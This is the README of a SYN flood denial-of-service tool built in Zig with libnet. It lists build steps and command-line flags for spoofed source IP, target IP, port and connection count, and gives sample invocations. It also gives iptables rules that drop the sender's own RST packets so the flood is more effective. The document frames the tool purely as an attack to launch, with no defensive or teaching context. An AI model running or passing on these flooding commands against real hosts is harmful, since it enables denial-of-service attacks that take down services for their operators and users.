# SynFlood

Start a SYN flood attack to an ip address.

## Requirements

- Zig
- libnet
	- `libnet1-dev` under Debian: `apt-get install libnet1-dev`
	- `libnet` under macOS: `brew install -s libnet`
- Root access for sending a packet.
- Its recommended to block all RST packets from the source host on the source host.
	
	```bash
	iptables -I OUTPUT -p tcp --dport 80 --tcp-flags RST RST -j DROP
	iptables -I OUTPUT -p tcp --dport 80 --tcp-flags RST ACK -j DROP
	```

## Build

1. Clone:
	
	```bash
	git clone https://github.com/TheFox/synflood.git
	```

2. In `synflood` directory, make:
	
	```bash
	zig build
	```
	
	Binary file is available as `zig-out/bin/synflood`.

3. Done.

## Usage

```bash
synflood [-h|--help] -s <IP> -d <IP> -p <PORT> -c <NUM>
```

- `-s`: Source IP address.
- `-d`: Destination IP address.
- `-p`: Destination port.
- `-c`: Number of connections.

Examples:

```bash
./synflood -s 192.168.241.31 -d 192.168.1.3 -p 80
./synflood -s 192.168.241.31 -d 192.168.1.3 -p 80 -c 1000
```
